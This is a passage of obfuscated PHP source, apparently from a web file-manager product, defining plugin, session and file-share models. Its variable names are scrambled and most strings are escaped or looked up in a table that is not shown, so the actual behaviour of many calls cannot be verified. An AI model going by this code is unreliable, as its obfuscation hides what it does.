(!trim($Œ­Ğ‚óø)) { return; } parent::writeLog(trim($Œ­Ğ‚óø), $ş¬§ŞÏ ); } } goto d­ÄòãÄö; a©§¾°ª‰: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\160\154\x75\147\151\x6e\114\151\x73\164"; public $field = array("\156\x61\155\x65", "\x73\x74\x61\164\x75\163", "\x72\145\x67\x69\x65\163\164", "\143\157\x6e\x66\151\x67"); public function loadList($¶¯î÷Ïì = false) { $Ëëâû„ó = array_to_keyvalue($this->listData(), $_SERVER[Õò”†—·][42]); if ($¶¯î÷Ïì) { return $Ëëâû„ó[$¶¯î÷Ïì]; } return $Ëëâû„ó; } public function init() { $Šğ§©Ñ =& $_SERVER[Õò”†—·]; Hook::trigger($Šğ§©Ñ[2078]); $—™Š—èÆ = $this->loadPluginList(); foreach ($—™Š—èÆ as $ÂÂ™óÑğ => $£øï·°) { $·Ø÷áÄÄ = $this->appAllow($ÂÂ™óÑğ, $£øï·°); if (!$·Ø÷áÄÄ) { continue; } foreach ($£øï·°[$Šğ§©Ñ[2079]] as $î‘Â—ó => $½Ùµ½©”) { Hook::bind($î‘Â—ó, $½Ùµ½©”); } } Hook::trigger($Šğ§©Ñ[2080]); Hook::trigger(ACTION); } public function appAllow($Õ§Õ”õó, $Ã¼åÍĞâ, $Ú«¿¤¬ª = true) { $õŠÈÖË =& $_SERVER[Õò”†—·]; $ß†êÅ±â = PLUGIN_DIR . $Õ§Õ”õó . $õŠÈÖË[2081]; if (!is_array($Ã¼åÍĞâ) || !is_array($Ã¼åÍĞâ[$õŠÈÖË[2079]]) || $Ã¼åÍĞâ[$õŠÈÖË[801]] != 1 || !is_file($ß†êÅ±â)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$õŠÈÖË[16]][$õŠÈÖË[2082]] || !$GLOBALS[$õŠÈÖË[16]][$õŠÈÖË[2083]]) { return !0; } $±Œ£€‰² = explode($õŠÈÖË[60], strtolower($GLOBALS[$õŠÈÖË[16]][$õŠÈÖË[2083]])); return in_array(strtolower($Õ§Õ”õó), $±Œ£€‰²) ? !1 : !0; } if ($Ú«¿¤¬ª && !Action($õŠÈÖË[2084])->checkAuth($Õ§Õ”õó)) { return !1; } return !0; } public function unInstall($ì³ô—ó’) { $æ½Ó²Ä• =& $_SERVER[Õò”†—·]; $ÀïË÷”† = $this->loadList($ì³ô—ó’); if (file_exists(PLUGIN_DIR . $ì³ô—ó’)) { Hook::apply($ì³ô—ó’ . $æ½Ó²Ä•[2085]); } $this->remove($ÀïË÷”†[$æ½Ó²Ä•[459]]); } public function changeStatus($ÜÁÛÌÜ, $÷áùŞ§›) { $ÆÈÜÁï€ =& $_SERVER[Õò”†—·]; $ûó¥Ë™Ü = $this->loadList($ÜÁÛÌÜ); if ($÷áùŞ§›) { Hook::apply($ÜÁÛÌÜ . $ÆÈÜÁï€[2086]); } $this->update($ûó¥Ë™Ü[$ÆÈÜÁï€[459]], array($ÆÈÜÁï€[2087] => $÷áùŞ§›)); } public function appRegist($¸¡Ò‰Ûå, $ô°Ğ€À) { $Ü„’÷æÉ =& $_SERVER[Õò”†—·]; $– Ö¬ì– = $this->loadList($¸¡Ò‰Ûå); if ($– Ö¬ì–) { $this->update($– Ö¬ì–[$Ü„’÷æÉ[459]], array($Ü„’÷æÉ[2079] => $ô°Ğ€À)); } else { $µ¹¬ã½ê = array($Ü„’÷æÉ[42] => $¸¡Ò‰Ûå, $Ü„’÷æÉ[2079] => $ô°Ğ€À, $Ü„’÷æÉ[801] => 0, $Ü„’÷æÉ[16] => $this->getConfigDefault($¸¡Ò‰Ûå)); $this->insert($µ¹¬ã½ê); } } public function getConfigDefault($Ä ¥£µ¦) { $ÒÃ¿—Ì =& $_SERVER[Õò”†—·]; $¡î©ìí = array(); $İ…ù¾É¥ = $this->getPackageJson($Ä ¥£µ¦); if (!$İ…ù¾É¥ && is_array($İ…ù¾É¥[$ÒÃ¿—Ì[2088]])) { return $¡î©ìí; } foreach ($İ…ù¾É¥[$ÒÃ¿—Ì[2088]] as $ñ¯³‰† => $±“â¹ë) { if (!isset($±“â¹ë[$ÒÃ¿—Ì[434]]) || isset($¡î©ìí[$ñ¯³‰†])) { continue; } $¡î©ìí[$ñ¯³‰†] = $±“â¹ë[$ÒÃ¿—Ì[434]]; } return $¡î©ìí; } public function getPackageJson($ŞÙä»Àö) { return Hook::apply($ŞÙä»Àö . $_SERVER[Õò”†—·][2089]); } public function getConfig($÷ÕÈùĞ§, $üÖÀ¥ÖÄ = false) { $ü¶ıÒÕ =& $_SERVER[Õò”†—·]; $¼ïòÔÓË = array(); $°¦²†€Ó = $this->loadList($÷ÕÈùĞ§); if ($°¦²†€Ó && is_array($°¦²†€Ó[$ü¶ıÒÕ[16]])) { $¼ïòÔÓË = $°¦²†€Ó[$ü¶ıÒÕ[16]]; } if (!$¼ïòÔÓË || $üÖÀ¥ÖÄ) { $¼ïòÔÓË = $this->getConfigDefault($÷ÕÈùĞ§); } return $¼ïòÔÓË; } public function setConfig($¹­Ø—åÏ, $¸½â÷Êš = false) { $Ã¶…­á =& $_SERVER[Õò”†—·]; $’Ë˜€¶ = $this->loadList($¹­Ø—åÏ); if (!$’Ë˜€¶) { return !1; } $ÅªìÃğ© = $’Ë˜€¶[$Ã¶…­á[16]]; if ($¸½â÷Êš == !1) { $ÅªìÃğ© = array(); $¸½â÷Êš = $this->getConfigDefault($¹­Ø—åÏ); } foreach ($¸½â÷Êš as $à§ˆûÈ => $ó–ÓÚ¸£) { $ÅªìÃğ©[$à§ˆûÈ] = is_string($ó–ÓÚ¸£) ? trim($ó–ÓÚ¸£) : $ó–ÓÚ¸£; } $this->update($’Ë˜€¶[$Ã¶…­á[459]], array($Ã¶…­á[16] => $ÅªìÃğ©)); } public function viewList() { $öŒ¸É”œ =& $_SERVER[Õò”†—·]; $Ä‰Êƒ¢ö = $this->loadList(); $this->pluginScan($Ä‰Êƒ¢ö); $Ä‰Êƒ¢ö = $this->loadPluginList(); $½–¢ÑÃ“ = array(); foreach ($Ä‰Êƒ¢ö as $å‹Ş·ÓÏ => $şòŒ›õ•) { $Õœ°ÈÜÇ = $şòŒ›õ•; unset($şòŒ›õ•[$öŒ¸É”œ[2079]], $şòŒ›õ•[$öŒ¸É”œ[16]]); $ìÍûìå = PLUGIN_DIR . $şòŒ›õ•[$öŒ¸É”œ[42]] . $öŒ¸É”œ[2081]; if (!is_file($ìÍûìå)) { continue; } $õæ“ºğ = Hook::apply($şòŒ›õ•[$öŒ¸É”œ[42]] . $öŒ¸É”œ[2089]); if (!is_array($õæ“ºğ)) { continue; } $½–¢ÑÃ“[$å‹Ş·ÓÏ] = array_merge($şòŒ›õ•, $õæ“ºğ); if ($Õœ°ÈÜÇ[$öŒ¸É”œ[16]][$öŒ¸É”œ[1668]] != $õæ“ºğ[$öŒ¸É”œ[1642]]) { Hook::apply($şòŒ›õ•[$öŒ¸É”œ[42]] . $öŒ¸É”œ[2086]); $Õœ°ÈÜÇ[$öŒ¸É”œ[16]][$öŒ¸É”œ[1668]] = $õæ“ºğ[$öŒ¸É”œ[1642]]; $this->update($şòŒ›õ•[$öŒ¸É”œ[459]], array($öŒ¸É”œ[16] => $Õœ°ÈÜÇ[$öŒ¸É”œ[16]])); } } return $½–¢ÑÃ“; } private function loadPluginList() { $Î·ûäà =& $_SERVER[Õò”†—·]; $»Æş²ò = $this->loadList(); if (strtolower(MOD) == $Î·ûäà[2090]) { return $»Æş²ò; } $Ä‘ç±ï÷ = Hook::trigger($Î·ûäà[2091], $»Æş²ò); if ($»Æş²ò && !$Ä‘ç±ï÷) { die; } return $Ä‘ç±ï÷ ? $Ä‘ç±ï÷ : $»Æş²ò; } private function pluginScan($™ğ°ç®Æ) { $å‚“ò¶ú =& $_SERVER[Õò”†—·]; recursion_dir(PLUGIN_DIR, $õıè‰é¶, $¦šò³ëª, 0); foreach ($õıè‰é¶ as $éªŞşÃ) { $Á¹’¹Š = get_path_this($éªŞşÃ); if (isset($™ğ°ç®Æ[$Á¹’¹Š]) || !file_exists($éªŞşÃ . $å‚“ò¶ú[2092]) || !file_exists($éªŞşÃ . $å‚“ò¶ú[2081])) { continue; } Hook::apply($Á¹’¹Š . $å‚“ò¶ú[2086]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\x73\145\163\163\151\157\156"; public function get($ ÷©Û§Ì) { $Ê–ŞÕ³ƒ =& $_SERVER[Õò”†—·]; $ûÜ’şÆ = $this->where(array($Ê–ŞÕ³ƒ[2093] => $ ÷©Û§Ì))->find(); if (!is_array($ûÜ’şÆ)) { return !1; } return $ûÜ’şÆ[$Ê–ŞÕ³ƒ[805]]; } public function set($Òëß€¡µ, $Ò´Êºóø, $¤£Ÿ÷—­ = 3600) { $äÏÙÈ‰¨ =& $_SERVER[Õò”†—·]; $ñ™Ìú¦ = array($äÏÙÈ‰¨[2093] => $Òëß€¡µ, $äÏÙÈ‰¨[1992] => $Ò´Êºóø, $äÏÙÈ‰¨[2094] => $¤£Ÿ÷—­ + time()); if (Session::get($äÏÙÈ‰¨[2095])) { $ñ™Ìú¦[$äÏÙÈ‰¨[1755]] = Session::get($äÏÙÈ‰¨[2095]); } else { $ñ™Ìú¦[$äÏÙÈ‰¨[1755]] = 0; } if ($this->get($Òëß€¡µ)) { return $this->where(array($äÏÙÈ‰¨[2093] => $Òëß€¡µ))->save($ñ™Ìú¦); } else { return $this->add($ñ™Ìú¦, array(), !0); } } public function remove($ ±àÂ‰) { return $this->where(array($_SERVER[Õò”†—·][2093] => $ ±àÂ‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Õò”†—·][2096] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\x72\x74\x2c\165\x70\144\141\x74\x65", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\x63\162\145\x61\164\x65\124\151\155\x65", "\x74\151\155\145", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x6f\160\164\151\157\x6e\x73", '', "\151\156\163\x65\x72\x74\54\x75\160\x64\141\x74\145\x2c\x73\x65\154\x65\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ã³óÎôø) { $•‘áüü =& $_SERVER[Õò”†—·]; $´¹†¯©£ = isset($ã³óÎôø[0]) ? $ã³óÎôø[0] : !1; return array($•‘áüü[2097] => array(USER_ID, $•‘áüü[2098]), $•‘áüü[2038] => array($´¹†¯©£, $•‘áüü[2099])); } protected function listSimple() { $ŠÃ¨é¶ = array($_SERVER[Õò”†—·][1755] => USER_ID); $¨ğØı« = $this->field($this->fieldList)->where($ŠÃ¨é¶)->select(); return $¨ğØı« ? $¨ğØı« : array(); } protected function getInfo($æ‘ÍàÇ, $ŞÀœÙÔ = false) { $óæåŸ÷İ =& $_SERVER[Õò”†—·]; if ($ŞÀœÙÔ) { return $this->_getShareInfo(array($óæåŸ÷İ[649] => $æ‘ÍàÇ)); } $‚ÌŞà¼² = $this->cacheFunctionGet($óæåŸ÷İ[2040], $æ‘ÍàÇ); return $‚ÌŞà¼²; } public function getInfoByHash($£ïˆ¬«ş) { return $this->_getShareInfo(array($_SERVER[Õò”†—·][2100] => $£ïˆ¬«ş)); } public function getInfoByPath($œ—›ñáü) { $¢×ÕÉ¦ =& $_SERVER[Õò”†—·]; $Àã­Å¯ = array($¢×ÕÉ¦[1755] => USER_ID, $¢×ÕÉ¦[194] => $œ—›ñáü); return $this->_getShareInfo($Àã­Å¯); } public function getInfoBySourcePath($Éï ãƒÃ) { $§«£À«õ =& $_SERVER[Õò”†—·]; $’Æ˜‚ëŒ = array($§«£À«õ[1755] => USER_ID, $§«£À«õ[1229] => $Éï ãƒÃ); return $this->_getShareInfo($’Æ˜‚ëŒ); } private function _getShareInfo($î×²¶Ğ‘) { $ø„Ö¤£ú =& $_SERVER[Õò”†—·]; $Ê©¾³ß = $this->where($î×²¶Ğ‘)->find(); if (!$Ê©¾³ß) { return !1; } $î×²¶Ğ‘ = array($ø„Ö¤£ú[649] => $Ê©¾³ß[$ø„Ö¤£ú[649]]); $ŸôÇ¬­² = $ø„Ö¤£ú[2101]; $œòªñÛ = Model($ø„Ö¤£ú[650])->order($ø„Ö¤£ú[459])->field($ŸôÇ¬­²)->where($î×²¶Ğ‘)->select(); if ($Ê©¾³ß[$ø„Ö¤£ú[194]] == $ø„Ö¤£ú[229]) { $Ê©¾³ß[$ø„Ö¤£ú[100]] = IO::info($Ê©¾³ß[$ø„Ö¤£ú[1229]]); } else { $Ê©¾³ß[$ø„Ö¤£ú[100]] = Model($ø„Ö¤£ú[1388])->pathInfo($Ê©¾³ß[$ø„Ö¤£ú[194]]); } $Ê©¾³ß[$ø„Ö¤£ú[2102]] = $œòªñÛ; return $Ê©¾³ß; } protected function getInfoAuth($¨ŸßÙ»ª) { $¿È“”…¨ =& $_SERVER[Õò”†—·]; $ÛÃ‡Û² = $this->getInfo($¨ŸßÙ»ª); if ($ÛÃ‡Û²[$¿È“”…¨[1755]] == USER_ID) { $ÛÃ‡Û²[$¿È“”…¨[471]] = $ÛÃ‡Û²[$¿È“”…¨[100]][$¿È“”…¨[471]]; } else { $ÛÃ‡Û²[$¿È“”…¨[471]] = Model($¿È“”…¨[552])->authMake($ÛÃ‡Û²[$¿È“”…¨[2102]]); } return $ÛÃ‡Û²; } protected function listData($¨¬ÅÉÔ = null, $Şçä¤ŠŞ = 300) { $Ğ‹°ù´¥ =& $_SERVER[Õò”†—·]; $‘ŞôÀÈÚ = array(array($Ğ‹°ù´¥[547] => array($Ğ‹°ù´¥[1062], 0), $Ğ‹°ù´¥[647] => array($Ğ‹°ù´¥[1062], 0), $Ğ‹°ù´¥[2103] => $Ğ‹°ù´¥[2056])); if ($¨¬ÅÉÔ == $Ğ‹°ù´¥[2104]) { $‘ŞôÀÈÚ = array($Ğ‹°ù´¥[547] => 1); } else { if ($¨¬ÅÉÔ == $Ğ‹°ù´¥[1214]) { $‘ŞôÀÈÚ = array($Ğ‹°ù´¥[647] => 1); } } $‘ŞôÀÈÚ[$Ğ‹°ù´¥[1755]] = USER_ID; $¡Ñ‘‰º¿ = $this->where($‘ŞôÀÈÚ)->selectPage($Şçä¤ŠŞ); return $¡Ñ‘‰º¿; } protected function listToMe($Û¾†¬Ä¨ = 300) { $ˆ¬¹ÇÜù =& $_SERVER[Õò”†—·]; $á™®¨ã£ = Model($ˆ¬¹ÇÜù[2105])->userGroupParents(USER_ID); $—×ıŞé¡ = array($ˆ¬¹ÇÜù[632] => SourceModel::TYPE_USER, $ˆ¬¹ÇÜù[554] => USER_ID); if ($á™®¨ã£) { $—×ıŞé¡ = array(array($ˆ¬¹ÇÜù[632] => SourceModel::TYPE_USER, $ˆ¬¹ÇÜù[554] => USER_ID), array($ˆ¬¹ÇÜù[632] => SourceModel::TYPE_GROUP, $ˆ¬¹ÇÜù[554] => array($ˆ¬¹ÇÜù[17], $á™®¨ã£)), $ˆ¬¹ÇÜù[2103] => $ˆ¬¹ÇÜù[2056]); } $²÷ß ¦ = Model($ˆ¬¹ÇÜù[650])->where($—×ıŞé¡)->selectPage($Û¾†¬Ä¨); $¶×İã™Í = array_to_keyvalue_group($²÷ß ¦[$ˆ¬¹ÇÜù[429]], $ˆ¬¹ÇÜù[649]); if (!$¶×İã™Í) { return $²÷ß ¦; } $Ç¼¯åĞ = $ˆ¬¹ÇÜù[2106]; $—×ıŞé¡ = array($ˆ¬¹ÇÜù[649] => array($ˆ¬¹ÇÜù[476], array_keys($¶×İã™Í)), $ˆ¬¹ÇÜù[1755] => array($ˆ¬¹ÇÜù[1064], $ˆ¬¹ÇÜù[229])); $‹ŞÆ¥Ï = $this->field($Ç¼¯åĞ)->where($—×ıŞé¡)->select(); foreach ($‹ŞÆ¥Ï as $¬Çù«¦ => &$•º şÁ®) { $•º şÁ®[$ˆ¬¹ÇÜù[2102]] = $¶×İã™Í[$•º şÁ®[$ˆ¬¹ÇÜù[649]]]; } unset($•º şÁ®); $ş÷µÍšØ = array($ˆ¬¹ÇÜù[2107] => $‹ŞÆ¥Ï, $ˆ¬¹ÇÜù[2108] => $²÷ß ¦[$ˆ¬¹ÇÜù[426]]); return $ş÷µÍšØ; } protected function shareAdd($»‰°Ü‹î, $Œşèñ¯’) { $İ†³ùŸŞ =& $_SERVER[Õò”†—·]; $³Ô»Úéª = $this->_addShareData($»‰°Ü‹î, $Œşèñ¯’); if (!empty($Œşèñ¯’[$İ†³ùŸŞ[2109]])) { $this->_shareAuthSet($³Ô»Úéª, $Œşèñ¯’[$İ†³ùŸŞ[2109]]); } $this->shareEventAdd($»‰°Ü‹î, $Œşèñ¯’, $İ†³ùŸŞ[2110]); return $³Ô»Úéª; } protected function shareAddSystem($¸æÏ›ÖÌ, $¸í»º¾£) { $›Â°’á¥ =& $_SERVER[Õò”†—·]; $Œ±©ÃË¶ = $this->_addShareData($¸æÏ›ÖÌ, $¸í»º¾£, $›Â°’á¥[192]); $this->_shareAuthSet($Œ±©ÃË¶, $¸í»º¾£[$›Â°’á¥[2109]]); return $Œ±©ÃË¶; } private function shareEventAdd($÷ı›Şó, $ˆª‚ÀŠ±, $Ÿ³÷ïÈ˜ = "\141\x64\x64") { $ÈìîêøÔ =& $_SERVER[Õò”†—·]; if (!$÷ı›Şó || $÷ı›Şó == $ÈìîêøÔ[229]) { return; } if ($Ÿ³÷ïÈ˜ == $ÈìîêøÔ[2110]) { if ($ˆª‚ÀŠ±[$ÈìîêøÔ[547]] == $ÈìîêøÔ[101]) { Model($ÈìîêøÔ[617])->eventShare($÷ı›Şó, $ÈìîêøÔ[2111]); } if ($ˆª‚ÀŠ±[$ÈìîêøÔ[647]] == $ÈìîêøÔ[101]) { Model($ÈìîêøÔ[617])->eventShare($÷ı›Şó, $ÈìîêøÔ[2112]); } return; } $è¯ÕëÇ¤ = $this->getInfoByPath($÷ı›Şó); $¯ƒ¹‹õÊ = $ÈìîêøÔ[2113]; if ($è¯ÕëÇ¤[$ÈìîêøÔ[547]] == $ÈìîêøÔ[229] && $ˆª‚ÀŠ±[$ÈìîêøÔ[547]] == $ÈìîêøÔ[101]) { $¯ƒ¹‹õÊ = $ÈìîêøÔ[2111]; } if ($è¯ÕëÇ¤[$ÈìîêøÔ[547]] == $ÈìîêøÔ[101] && $ˆª‚ÀŠ±[$ÈìîêøÔ[547]] == $ÈìîêøÔ[229]) { $¯ƒ¹‹õÊ = $ÈìîêøÔ[2114]; } if ($è¯ÕëÇ¤[$ÈìîêøÔ[647]] == $ÈìîêøÔ[229] && $ˆª‚ÀŠ±[$ÈìîêøÔ[647]] == $ÈìîêøÔ[101]) { $¯ƒ¹‹õÊ = $ÈìîêøÔ[2112]; } if ($è¯ÕëÇ¤[$ÈìîêøÔ[647]] == $ÈìîêøÔ[101] && $ˆª‚ÀŠ±[$ÈìîêøÔ[647]] == $ÈìîêøÔ[229]) { $¯ƒ¹‹õÊ = $ÈìîêøÔ[2115]; } Model($ÈìîêøÔ[617])->eventShare($÷ı›Şó, $¯ƒ¹‹õÊ); return; } private function _addShareData($óıšì³, $Œ®¬Ã¸³ = array(), $Å Ş“Æ¾ = false) { $ÕºÄøÔ½ =& $_SERVER[Õò”†—·]; $Ÿ´‚ò  = $Å Ş“Æ¾ == $ÕºÄøÔ½[192] ? 0 : USER_ID; $”Ó©ß¿Š = array($ÕºÄøÔ½[475] => $óıšì³, $ÕºÄøÔ½[1746] => $Ÿ´‚ò ); if ($óıšì³ == 0) { $”Ó©ß¿Š = array($ÕºÄøÔ½[2116] => $Œ®¬Ã¸³[$ÕºÄøÔ½[1229]], $ÕºÄøÔ½[1746] => $Ÿ´‚ò ); } if ($äããŞÚÖ = $this->where($”Ó©ß¿Š)->find()) { return $äããŞÚÖ[$ÕºÄøÔ½[649]]; } if ($óıšì³ == 0) { $Œ¹¬ÀÄŠ = array($ÕºÄøÔ½[42] => get_path_this($Œ®¬Ã¸³[$ÕºÄøÔ½[97]])); } else { $Œ¹¬ÀÄŠ = Model($ÕºÄøÔ½[875])->sourceInfo($óıšì³); if (!$Œ¹¬ÀÄŠ) { return !1; } } if (!$Œ®¬Ã¸³[$ÕºÄøÔ½[1643]]) { $Œ®¬Ã¸³[$ÕºÄøÔ½[1643]] = $Œ¹¬ÀÄŠ[$ÕºÄøÔ½[42]]; } $­Âº„‘’ = array($ÕºÄøÔ½[1746] => $Ÿ´‚ò , $ÕºÄøÔ½[475] => $óıšì³, $ÕºÄøÔ½[1643] => $ÕºÄøÔ½[22], $ÕºÄøÔ½[547] => 0, $ÕºÄøÔ½[647] => 0, $ÕºÄøÔ½[1229] => $ÕºÄøÔ½[22], $ÕºÄøÔ½[367] => $ÕºÄøÔ½[22], $ÕºÄøÔ½[939] => $ÕºÄøÔ½[22], $ÕºÄøÔ½[2117] => 0, $ÕºÄøÔ½[2118] => 0, $ÕºÄøÔ½[812] => 0, $ÕºÄøÔ½[2119] => $ÕºÄøÔ½[22], $ÕºÄøÔ½[2100] => $ÕºÄøÔ½[22]); $ÊŠ …” = explode($ÕºÄøÔ½[60], $ÕºÄøÔ½[2120]); foreach ($ÊŠ …” as $ğ•Œóô©) { if (!isset($Œ®¬Ã¸³[$ğ•Œóô©])) { continue; } $­Âº„‘’[$ğ•Œóô©] = $Œ®¬Ã¸³[$ğ•Œóô©]; } $¦ù•˜¿å = $this->add($­Âº„‘’); $††Ä£ü = array($ÕºÄøÔ½[2100] => short_id($¦ù•˜¿å)); $this->where(array($ÕºÄøÔ½[2121] => $¦ù•˜¿å))->save($††Ä£ü); return $¦ù•˜¿å; } private function _shareAuthSet($³·²˜š , $øˆ İ—À) { $ªÁØ“º§ =& $_SERVER[Õò”†—·]; if (!is_array($øˆ İ—À)) { return !1; } $¶åà°¡ı = Model($ªÁØ“º§[2066]); $¶åà°¡ı->where(array($ªÁØ“º§[649] => $³·²˜š ))->delete(); $”¡Ç¦İô = array(); foreach ($øˆ İ—À as $íãÕ´‚Í) { $Õîº¦ïÂ = SourceModel::TYPE_USER; if ($íãÕ´‚Í[$ªÁØ“º§[191]] == SourceModel::TYPE_GROUP) { $Õîº¦ïÂ = SourceModel::TYPE_GROUP; } $ìÚúœ§· = array($ªÁØ“º§[649] => $³·²˜š , $ªÁØ“º§[191] => $Õîº¦ïÂ, $ªÁØ“º§[554] => intval($íãÕ´‚Í[$ªÁØ“º§[554]]), $ªÁØ“º§[2062] => 0, $ªÁØ“º§[2122] => -1); if ($íãÕ´‚Í[$ªÁØ“º§[2062]]) { $ìÚúœ§·[$ªÁØ“º§[2062]] = $íãÕ´‚Í[$ªÁØ“º§[2062]]; } else { if ($íãÕ´‚Í[$ªÁØ“º§[2122]]) { $ìÚúœ§·[$ªÁØ“º§[2122]] = $íãÕ´‚Í[$ªÁØ“º§[2122]]; } } $”¡Ç¦İô[] = $ìÚúœ§·; } return $¶åà°¡ı->addAll($”¡Ç¦İô, array(), !0); } public function numViewAdd($‰´…’Ìó) { $¾ÛèĞéò =& $_SERVER[Õò”†—·]; $ş£Ìİˆƒ = array($¾ÛèĞéò[2121] => $‰´…’Ìó); $this->where($ş£Ìİˆƒ)->setAdd($¾ÛèĞéò[2117]); } public function numDownloadAdd($±½Èà ä) { $•€¤İîµ =& $_SERVER[Õò”†—·]; $“°æ„Ü­ = array($•€¤İîµ[2121] => $±½Èà ä); $this->where($“°æ„Ü­)->setAdd($•€¤İîµ[2118]); } protected function shareEdit($Ò¤å¹¨Ö, $èĞ®£Ú˜) { $âğ™ÄÈØ =& $_SERVER[Õò”†—·]; $ßÈÕ¾´ = $this->getInfo($Ò¤å¹¨Ö); if (!$ßÈÕ¾´) { return !1; } $this->_checkLinkShare($èĞ®£Ú˜, $ßÈÕ¾´); $å­€§·Ÿ = array(); $Õ‚›·§„ = explode($âğ™ÄÈØ[60], $âğ™ÄÈØ[2123]); foreach ($Õ‚›·§„ as $¸•§îÊ¡) { if (!array_key_exists($¸•§îÊ¡, $èĞ®£Ú˜)) { continue; } $å­€§·Ÿ[$¸•§îÊ¡] = $èĞ®£Ú˜[$¸•§îÊ¡]; } $this->shareEventAdd($ßÈÕ¾´[$âğ™ÄÈØ[194]], $èĞ®£Ú˜, $âğ™ÄÈØ[1923]); $this->where(array($âğ™ÄÈØ[2121] => $Ò¤å¹¨Ö))->save($å­€§·Ÿ); if (isset($èĞ®£Ú˜[$âğ™ÄÈØ[2109]])) { $this->_shareAuthSet($Ò¤å¹¨Ö, $èĞ®£Ú˜[$âğ™ÄÈØ[2109]]); } return !0; } private function _checkLinkShare($ùüææ²¬, $‘¾Ù¦ù) { $ÇÒãÍ”ƒ =& $_SERVER[Õò”†—·]; if ($ùüææ²¬[$ÇÒãÍ”ƒ[547]] != $ÇÒãÍ”ƒ[101]) { return; } $‹¤ú††­ = $‘¾Ù¦ù[$ÇÒãÍ”ƒ[100]][$ÇÒãÍ”ƒ[194]]; if ($‘¾Ù¦ù[$ÇÒãÍ”ƒ[100]][$ÇÒãÍ”ƒ[43]] != $ÇÒãÍ”ƒ[231]) { $ùÓ·Ä» = $this->_folderReport($‹¤ú††­); if (!$ùÓ·Ä») { return; } show_json(LNG($ÇÒãÍ”ƒ[2124]) . $ÇÒãÍ”ƒ[2125] . $ùÓ·Ä», !1); } $Ô˜êÙ²Ê = Model($ÇÒãÍ”ƒ[875])->fileInfoGet($‘¾Ù¦ù[$ÇÒãÍ”ƒ[100]][$ÇÒãÍ”ƒ[194]]); if (!$Ô˜êÙ²Ê) { return; } $ßòğÉ = $this->shareFileMeta($Ô˜êÙ²Ê[$ÇÒãÍ”ƒ[525]]); if (isset($ßòğÉ[$ÇÒãÍ”ƒ[434]]) && $ßòğÉ[$ÇÒãÍ”ƒ[434]] == $ÇÒãÍ”ƒ[101]) { show_json(LNG($ÇÒãÍ”ƒ[2126]), !1); } } private function _folderReport($Ò³ô¾æ®) { $¯ Ä÷Ì€ =& $_SERVER[Õò”†—·]; $ùİ§Ê¦² = array($¯ Ä÷Ì€[525] => array($¯ Ä÷Ì€[1062], 0), $¯ Ä÷Ì€[801] => 3); $ı‡ß—›ô = Model($¯ Ä÷Ì€[2127])->where($ùİ§Ê¦²)->field($¯ Ä÷Ì€[525])->select(); if (!$ı‡ß—›ô) { return !1; } $ı‡ß—›ô = array_to_keyvalue($ı‡ß—›ô, $¯ Ä÷Ì€[22], $¯ Ä÷Ì€[525]); $À¿„¥‰Ğ = $¯ Ä÷Ì€[60] . $Ò³ô¾æ® . $¯ Ä÷Ì€[60]; $ùİ§Ê¦² = array($¯ Ä÷Ì€[525] => array($¯ Ä÷Ì€[17], $ı‡ß—›ô), $¯ Ä÷Ì€[569] => array($¯ Ä÷Ì€[443], "\45{$À¿„¥‰Ğ}\x25"), $¯ Ä÷Ì€[489] => 0); $“‡¼Ø‘Ô = Model($¯ Ä÷Ì€[875])->where($ùİ§Ê¦²)->field($¯ Ä÷Ì€[2128])->find(); if (!$“‡¼Ø‘Ô) { return !1; } $ä±£î = substr($“‡¼Ø‘Ô[$¯ Ä÷Ì€[569]], strpos($“‡¼Ø‘Ô[$¯ Ä÷Ì€[569]], $À¿„¥‰Ğ)); $ùİ§Ê¦² = array($¯ Ä÷Ì€[194] => array($¯ Ä÷Ì€[17], trim($ä±£î, $¯ Ä÷Ì€[60]))); $šŠ€÷¿à = Model($¯ Ä÷Ì€[875])->where($ùİ§Ê¦²)->field($¯ Ä÷Ì€[42])->select(); $¤İÄ©Î = array_to_keyvalue($šŠ€÷¿à, $¯ Ä÷Ì€[22], $¯ Ä÷Ì€[42]); $¤İÄ©Î[] = $“‡¼Ø‘Ô[$¯ Ä÷Ì€[42]]; return implode($¯ Ä÷Ì€[18], $¤İÄ©Î); } protected function remove($¯ÇÎ•Ø·) { $ÓçƒÂÙè =& $_SERVER[Õò”†—·]; if (is_array($¯ÇÎ•Ø·)) { $¯ÇÎ•Ø· = array($ÓçƒÂÙè[17], $¯ÇÎ•Ø·); } $…Ü¥¿é = array($ÓçƒÂÙè[649] => $¯ÇÎ•Ø·); $’ÓÛÇç = $this->where($…Ü¥¿é)->delete(); if ($’ÓÛÇç) { Model($ÓçƒÂÙè[650])->where(array($ÓçƒÂÙè[649] => $¯ÇÎ•Ø·))->delete(); } $òàó»êê = is_array($¯ÇÎ•Ø·) ? $¯ÇÎ•Ø·[1] : array($¯ÇÎ•Ø·); for ($‡¹€”Š = 0; $‡¹€”Š < count($òàó»êê); $‡¹€”Š++) { $Âªº±ÈÓ = $this->getInfo($òàó»êê[$‡¹€”Š]); if ($Âªº±ÈÓ[$ÓçƒÂÙè[647]] == $ÓçƒÂÙè[101]) { Model($ÓçƒÂÙè[617])->eventShare($Âªº±ÈÓ[$ÓçƒÂÙè[194]], $ÓçƒÂÙè[2115]); } if ($Âªº±ÈÓ[$ÓçƒÂÙè[547]] == $ÓçƒÂÙè[101]) { Model($ÓçƒÂÙè[617])->eventShare($Âªº±ÈÓ[$ÓçƒÂÙè[194]], $ÓçƒÂÙè[2114]); } } return $’ÓÛÇç; } protected function removeBySource($™¼Æ°ù) { $û¾±øÀ =& $_SERVER[Õò”†—·]; $´ÜÄú·ë = array($û¾±øÀ[475] => array($û¾±øÀ[476], $™¼Æ°ù)); $Ê™¶É = $this->field($û¾±øÀ[649])->where($´ÜÄú·ë)->select(); $Ê™¶É = array_to_keyvalue($Ê™¶É, $û¾±øÀ[22], $û¾±øÀ[649]); if (!$Ê™¶É) { return; } $´ÜÄú·ë = array($û¾±øÀ[2121] 